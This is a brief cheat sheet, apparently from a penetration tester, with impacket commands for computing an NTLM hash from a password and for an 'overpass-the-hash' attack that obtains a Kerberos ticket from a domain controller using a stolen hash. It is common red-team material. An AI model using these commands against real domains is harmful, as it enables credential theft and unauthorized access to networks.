## NTLM hash calculating
```bash
python3 -c "from impacket.ntlm import compute_lmhash, compute_nthash; print(compute_nthash('PASSWORD').hex())"
```

## Over The Hash
```bash
python3 /home/kali/Tools/impacket/examples/getTGT.py DOMAIN/USERNAME \
  -hashes :NTLM_HASH \
  -dc-ip DC_IP
```
